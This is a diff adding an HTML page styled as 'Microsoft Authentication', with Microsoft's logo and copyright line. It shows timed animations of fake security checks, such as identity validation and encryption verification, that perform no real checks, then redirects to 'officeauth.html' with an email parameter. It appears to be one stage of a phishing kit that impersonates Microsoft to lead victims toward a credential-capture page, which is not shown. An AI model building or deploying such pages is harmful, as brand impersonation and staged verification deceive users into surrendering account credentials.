@@ -1,0 +1,171 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft Authentication</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: linear-gradient(135deg, #f3f6fa, #ffffff);
+      color: #222;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      background: #fff;
+      border-radius: 12px;
+      padding: 40px 45px;
+      width: 460px;
+      box-shadow: 0 12px 28px rgba(0,0,0,0.12);
+      text-align: center;
+    }
+
+    .logo {
+      width: 70px;
+      margin-bottom: 20px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    h1 {
+      font-size: 22px;
+      color: #0078d4;
+      margin-bottom: 12px;
+    }
+
+    p.sub {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 30px;
+    }
+
+    .loading-steps {
+      text-align: left;
+    }
+
+    .step {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      font-size: 14px;
+      border-bottom: 1px solid #f1f1f1;
+      color: #666;
+    }
+
+    .step.active {
+      color: #0078d4;
+      font-weight: 500;
+    }
+
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid #ccc;
+      border-top: 2px solid #0078d4;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none; /* hidden by default */
+    }
+
+    .checkmark {
+      color: #16a34a;
+      font-size: 16px;
+      display: none; /* hidden until completed */
+    }
+
+    .step.active .spinner {
+      display: inline-block; /* only active step shows spinner */
+    }
+
+    .step.completed .checkmark {
+      display: inline;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
+    .progress {
+      margin-top: 25px;
+      width: 100%;
+      height: 8px;
+      background: #e4e8ef;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0;
+      background: #0078d4;
+      transition: width 0.5s ease;
+    }
+
+    .footer {
+      margin-top: 25px;
+      font-size: 11px;
+      color: #999;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo" alt="Microsoft Logo">
+    <h1>Microsoft Authentication</h1>
+
+          <p class="sub">Performing advanced security checks…</p>
+    
+    <div class="loading-steps" id="steps">
+      <div class="step"><span>Initializing secure session</span> <div class="spinner"></div><span class="checkmark">✔</span></div>
+      <div class="step"><span>Checking browser compliance</span> <div class="spinner"></div><span class="checkmark">✔</span></div>
+      <div class="step"><span>Verifying encryption protocols</span> <div class="spinner"></div><span class="checkmark">✔</span></div>
+      <div class="step"><span>Validating user identity</span> <div class="spinner"></div><span class="checkmark">✔</span></div>
+      <div class="step"><span>Finalizing authentication</span> <div class="spinner"></div><span class="checkmark">✔</span></div>
+    </div>
+
+    <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+
+    <div class="footer">© 2025 Microsoft Corporation</div>
+  </div>
+
+  <script>
+    const steps = document.querySelectorAll(".step");
+    const progressBar = document.getElementById("progressBar");
+    let currentStep = 0;
+
+    function showStep() {
+      if (currentStep < steps.length) {
+        // mark current as active
+        steps[currentStep].classList.add("active");
+
+        // after delay, complete it
+        setTimeout(() => {
+          steps[currentStep].classList.remove("active");
+          steps[currentStep].classList.add("completed");
+          progressBar.style.width = ((currentStep + 1) / steps.length) * 100 + "%";
+
+          currentStep++;
+          showStep();
+        }, 2400);
+      } else {
+        setTimeout(() => {
+          let email = "";
+          let redirect = "officeauth.html" + (email ? "?email=" + email : "");
+          window.location.href = redirect;
+        }, 800);
+      }
+    }
+
+    window.onload = showStep;
+  </script>
+</body>
+</html>
